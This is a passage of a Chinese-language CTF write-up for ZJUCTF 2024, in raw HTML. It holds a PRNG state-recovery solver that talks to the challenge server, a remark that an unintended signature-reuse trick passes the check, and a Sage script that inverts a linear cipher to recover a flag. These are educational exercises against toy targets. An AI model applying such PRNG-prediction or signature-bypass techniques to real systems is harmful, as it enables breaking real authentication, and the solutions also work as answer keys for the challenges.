class="hljs-number">16</span>)<br>c   = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>d   = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>io.recvline()<br>R0  = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>R1  = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>sha = io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;sha256(R)[:16] = &quot;</span>):-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(sha)<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(sha)==<span class="hljs-number">16</span><br><span class="hljs-built_in">print</span>(a,b,c,d,R0,R1,sha)<br>p = (R1*d-(a*d*R0+b))%c<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">t,r</span>):<br>    <span class="hljs-keyword">return</span> (a*t+b+R0*d*a)%c == R1*d+r<br><br>k = <span class="hljs-number">0</span><br>bitlength = <span class="hljs-number">2</span>**<span class="hljs-number">256</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    guess = []<br>    q = c*k + p<br>    t = q//a+<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> t &gt; bitlength:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        r = a*t-q<br>        <span class="hljs-keyword">if</span> r &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> r &gt; d:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> test(t,r):<br>                <span class="hljs-built_in">print</span>([t,r,k])<br>                K = R0*d+t<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>                    guess.append(K//d)<br>                    K = (K*a+b)%c<br>                digest = sha256(reduce(<span class="hljs-keyword">lambda</span> x, y: x + i2b(y), guess, <span class="hljs-string">b&quot;&quot;</span>)).hexdigest()<br>                <span class="hljs-keyword">if</span> digest[:<span class="hljs-number">16</span>]==sha:<br>                    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>                        io.recv()<br>                        io.sendline(<span class="hljs-built_in">hex</span>(guess[j]))<br>                    io.interactive()<br>        t += <span class="hljs-number">1</span><br>    k += <span class="hljs-number">1</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/11.png" srcset="/img/loading.gif" lazyload></li>
</ul>
<h2 id="shadowtime">shadowtime</h2>
<ul>
<li>仔细看了看源码，发现把sign得到的签名去verify就能过检测?应该是非预期解，本来就不怎么会椭圆曲线数字签名，这下好了() <img src="/img/zjuctf2024/16.png" srcset="/img/loading.gif" lazyload></li>
</ul>
<h2 id="line">line</h2>
<ul>
<li>只是一个程序，感觉有点算rev的题目，放到ida逆向，发现是对flag和key做了处理后得到的东西与cip内的值进行比较: <img src="/img/zjuctf2024/17.png" srcset="/img/loading.gif" lazyload></li>
<li>flag只有16个字符，key只有8个字符，而最后的结果也只有16个字符，其中flag的<code>ZJUCTF&#123;&#125;</code>我是知道的，那么就是16个字符未知，结果16个字符已知；如果我们把加密过程看作一个矩阵(192*128)，构造输入求出矩阵值，再根据结果求解输入即可(要求是加密过程线性并且矩阵满秩)，选择恰当的行使得矩阵满秩；</li>
<li>我先逆向了加密过程（但是后来发现根本不用逆向，因为程序把加密后的结果输出出来了！man！费我2小时），然后构造矩阵，对ans进行处理减去已知字节行，发现秩是110，但是这时还是128的输入，sage库无法解非满秩方程，于是就得爆破线性相关的18组对应的值，对每个可能解方程，看结果是否符合flag：</li>
<li>减去已知行求秩： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">import</span> copy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">flaglis,keylis</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):    <span class="hljs-comment">#len(flaglis)</span><br>        flaglis[i] ^= keylis[i&amp;<span class="hljs-number">7</span>]<br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">what</span>(<span class="hljs-params">a,b</span>):<br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        <span class="hljs-keyword">if</span> b&amp;<span class="hljs-number">1</span>!=<span class="hljs-number">0</span>:<br>            tmp^=a<br>        a = (a*<span class="hljs-number">2</span>)%(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">if</span> a&gt;=<span class="hljs-number">2</span>**<span class="hljs-number">7</span>:<br>            a^=<span class="hljs-number">0x1b</span><br>        b = b&gt;&gt;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> tmp<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alpha</span>(<span class="hljs-params">flagpiece,index</span>):<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> i&gt;=index:<br>            <span class="hljs-keyword">break</span><br>        flagpiece = flagpiece[<span class="hljs-number">1</span>:]+flagpiece[:<span class="hljs-number">1</span>]<br>        i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> flagpiece<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">beta</span>(<span class="hljs-params">tmp</span>):<br>    newflagpiece = [<span class="hljs-number">0</span>]*<span class="hljs-number">4</span><br>    newflagpiece[<span class="hljs-number">0</span>] = what(tmp[<span class="hljs-number">0</span>],<span class="hljs-number">2</span>)^what(tmp[<span class="hljs-number">1</span>],<span class="hljs-number">3</span>)^what(tmp[<span class="hljs-number">2</span>],<span class="hljs-number">1</span>)^what(tmp[<span class="hljs-number">3</span>],<span class="hljs-number">1</span>)<br>    newflagpiece[<span class="hljs-number">1</span>] = what(tmp[<span class="hljs-number">0</span>],<span class="hljs-number">1</span>)^what(tmp[<span class="hljs-number">1</span>],<span class="hljs-number">2</span>)^what(tmp[<span class="hljs-number">2</span>],<span class="hljs-number">3</span>)^what(tmp[<span class="hljs-number">3</span>],<span class="hljs-number">1</span>)<br>    newflagpiece[<span class="hljs-number">2</span>] = what(tmp[<span class="hljs-number">0</span>],<span class="hljs-number">1</span>)^what(tmp[<span class="hljs-number">1</span>],<span class="hljs-number">1</span>)^what(tmp[<span class="hljs-number">2</span>],<span class="hljs-number">2</span>)^what(tmp[<span class="hljs-number">3</span>],<span class="hljs-number">3</span>)<br>    newflagpiece[<span class="hljs-number">3</span>] = what(tmp[<span class="hljs-number">0</span>],<span class="hljs-number">3</span>)^what(tmp[<span class="hljs-number">1</span>],<span class="hljs-number">1</span>)^what(tmp[<span class="hljs-number">2</span>],<span class="hljs-number">1</span>)^what(tmp[<span class="hljs-number">3</span>],<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">return</span> newflagpiece<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magicspell1</span>(<span class="hljs-params">flaglis</span>):<br>    <span class="hljs-comment"># print(flaglis)</span><br>    newflaglis = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        newflaglis.extend(alpha(flaglis[i*<span class="hljs-number">4</span>:i*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>],i))<br>    <span class="hljs-keyword">return</span> newflaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magicspell2</span>(<span class="hljs-params">flaglis</span>):<br>    flagpiece = [<span class="hljs-number">0</span>]*<span class="hljs-number">4</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            flagpiece[j] = flaglis[<span class="hljs-number">4</span>*j+i]<br>        res = beta(flagpiece)<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            flaglis[<span class="hljs-number">4</span>*k+i] = res[k]<br>    <span class="hljs-keyword">return</span> flaglis<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magic</span>(<span class="hljs-params">flaglis,keylis,times=<span class="hljs-number">0xaaa</span></span>):<br>    flaglis = add(flaglis,keylis)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,times):<br>        flaglis = magicspell1(flaglis)<br>        flaglis = magicspell2(flaglis)<br>    flaglis = magicspell1(flaglis)<br>    flaglis = add(flaglis,keylis)<br>    <span class="hljs-keyword">return</span> flaglis<br><br>length = (<span class="hljs-number">16</span>+<span class="hljs-number">8</span>)*<span class="hljs-number">8</span><br>anslength = <span class="hljs-number">128</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate</span>(<span class="hljs-params">key</span>):<br>    <span class="hljs-keyword">global</span> check<br>    inputs = [<span class="hljs-string">&#x27;0&#x27;</span>]*length<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        inputs[i]=<span class="hljs-built_in">str</span>(key%<span class="hljs-number">2</span>)<br>        key = key&gt;&gt;<span class="hljs-number">1</span><br>    tmp = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,length,<span class="hljs-number">8</span>):<br>        tmp.append(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(inputs[i:i+<span class="hljs-number">8</span>]),<span class="hljs-number">2</span>))<br>    flaglis = tmp[:<span class="hljs-number">16</span>]<br>    keylis = tmp[<span class="hljs-number">16</span>:]<br>    res = magic(flaglis,keylis)<br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mykey</span>():<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i&lt;(length):<br>        key = <span class="hljs-number">1</span>&lt;&lt;(length-i-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">yield</span> generate(key)<br>        i+=<span class="hljs-number">1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getRow</span>():<br>    temp = mykey()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>        s = <span class="hljs-built_in">next</span>(temp)<br>        row = vector(GF(<span class="hljs-number">2</span>),[<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> s <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> t])<br>        <span class="hljs-keyword">yield</span> row<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buildBox</span>():<br>    box = matrix(GF(<span class="hljs-number">2</span>),length,anslength)<br>    rg = getRow()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(length)):<br>        box[i] = <span class="hljs-built_in">next</span>(rg)<br>    <span class="hljs-keyword">return</span> box<br><br><span class="hljs-comment"># b_192_128 = buildBox()</span><br><span class="hljs-comment"># with open(&#x27;box.txt&#x27;,&#x27;w&#x27;) as f:</span><br><span class="hljs-comment">#     f.write(str(b_192_128))</span><br>b_192_128 = matrix(GF(<span class="hljs-number">2</span>),length,anslength)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;box.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    rowcnt = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>        b_192_128[i] = vector(GF(<span class="hljs-number">2</span>),[<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> f.readline().strip().replace(<span class="hljs-string">&#x27;[&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;]&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).split(<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> t])<br><br>testflag = <span class="hljs-string">&quot;ZJUCTF&#123;11451419&#125;&quot;</span><br>testkey = <span class="hljs-string">&quot;hahahaha&quot;</span><br>ans = magic([<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> testflag],[<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> testkey])<br><span class="hljs-built_in">print</span>(ans)<br>b_flag = vector(GF(<span class="hljs-number">2</span>), [<span class="hljs-built_in">int</span>(t) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> testflag+testkey] <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> x])<br>leak = vector(GF(<span class="hljs-number">2</span>), [<span class="hljs-built_in">int</span>(t) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ans] <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> x])<br><span class="hljs-keyword">assert</span> b_flag*b_192_128==leak<br><br>knownindex = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>*<span class="hljs-number">8</span>)]+[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>*<span class="hljs-number">8</span>,<span class="hljs-number">16</span>*<span class="hljs-number">8</span>)]<br>known = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ZJUCTF&#123;********&#125;&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(j))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)]<br>b_128_128 = matrix(GF(<span class="hljs-number">2</span>),length-<span class="hljs-built_in">len</span>(knownindex),anslength)<br>test = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> testflag[<span class="hljs-number">7</span>:<span class="hljs-number">15</span>]+testkey])<br>new_flag = vector(GF(<span class="hljs-number">2</span>), [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> test])<br>newleak = leak<br>b_index = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> knownindex:<br>        b_128_128[b_index] = b_192_128[i]<br>        b_index+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(anslength):<br>            newleak[j] = newleak[j]+known[i]*b_192_128[i,j]<br><span class="hljs-keyword">assert</span> new_flag*b_128_128==newleak<br><span class="hljs-built_in">print</span>(b_128_128.rank())  <span class="hljs-comment">#110</span><br></code></pre></td></tr></table></figure></li>
<li>选取恰当的爆破行使得矩阵的秩不变: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">b = b_128_128.transpose()<br>echelon_b = b.echelon_form()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;阶梯形矩阵:&quot;</span>)<br><span class="hljs-built_in">print</span>(echelon_b)<br><br>choices = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>    choices.append([])<br><br>rows, cols = echelon_b.nrows(), echelon_b.ncols()<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(cols):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rows-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> echelon_b[i, j] == <span class="hljs-number">1</span>:<br>            choices[i].append(j)<br>            <span class="hljs-keyword">break</span> <br><span class="hljs-built_in">print</span>(choices)<br><br>b_110_128 = matrix(GF(<span class="hljs-number">2</span>),<span class="hljs-number">110</span>,anslength)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">110</span>):<br>    b_110_128[i] = b_128_128[i]<br>b_110_128[<span class="hljs-number">80</span>] = b_128_128[<span class="hljs-number">110</span>]<br>b_110_128[<span class="hljs-number">88</span>] = b_128_128[<span class="hljs-number">111</span>]<br><span class="hljs-built_in">print</span>(b_110_128.rank())<br></code></pre></td></tr></table></figure></li>
<li>爆破对应行的值，输出结果: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python">ans = [<span class="hljs-number">0xd5</span>,<span class="hljs-number">0xe3</span>,<span class="hljs-number">0x98</span>,<span class="hljs-number">0xc6</span>,<span class="hljs-number">0x94</span>,<span class="hljs-number">0xc2</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0xb7</span>,<span class="hljs-number">0xd6</span>,<span class="hljs-number">0x8f</span>,<span class="hljs-number">0xd5</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x4b</span>,<span class="hljs-number">0x87</span>,<span class="hljs-number">0xe0</span>]<br>leak = vector(GF(<span class="hljs-number">2</span>), [<span class="hljs-built_in">int</span>(t) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ans] <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> x])<br>knownindex = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>*<span class="hljs-number">8</span>)]+[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>*<span class="hljs-number">8</span>,<span class="hljs-number">16</span>*<span class="hljs-number">8</span>)]<br>known = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ZJUCTF&#123;********&#125;&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(j))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)]<br>b_128_128 = matrix(GF(<span class="hljs-number">2</span>),length-<span class="hljs-built_in">len</span>(knownindex),anslength)<br>newleak = leak<br>b_index = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> knownindex:<br>        b_128_128[b_index] = b_192_128[i]<br>        b_index+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(anslength):<br>            newleak[j] = newleak[j]+known[i]*b_192_128[i,j]<br><br><span class="hljs-built_in">print</span>(b_128_128.rank())<br>guesslen = anslength-b_128_128.rank()<br>guesskindex = [<span class="hljs-number">80</span>-<span class="hljs-number">8</span>,<span class="hljs-number">88</span>-<span class="hljs-number">8</span>]+[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(anslength-guesslen+<span class="hljs-number">2</span>,anslength)]<br>b_110_128 = matrix(GF(<span class="hljs-number">2</span>),anslength-guesslen,anslength)<br>tmp = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(anslength-guesslen):<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> guesskindex:<br>        b_110_128[tmp]=b_128_128[i]<br>        tmp+=<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**guesslen):<br>    guessk = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(guesslen)]<br>    tmpleak = copy.deepcopy(newleak)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(guessk)==guesslen<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(guesslen):<br>        <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(anslength):<br>            <span class="hljs-comment"># print(guesskindex[j])</span><br>            tmpleak[z] = tmpleak[z]+guessk[j]*b_128_128[guesskindex[j],z]<br>    <span class="hljs-keyword">try</span>:<br>        tmp = b_110_128.solve_left(tmpleak)<br>        <span class="hljs-comment"># print(tmp)</span><br>        flag = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp])[:<span class="hljs-number">64</span>]<br>        <span class="hljs-built_in">print</span>(i,end=<span class="hljs-string">&quot; &quot;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">8</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(flag[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>)),end=<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>()<br>        <span class="hljs-comment"># break</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-comment"># ZJUCTF&#123;M47rlx!?&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/18.png" srcset="/img/loading.gif" lazyload></li>
</ul>
<h2 id="insane-pad">insane pad</h2>
<ul>
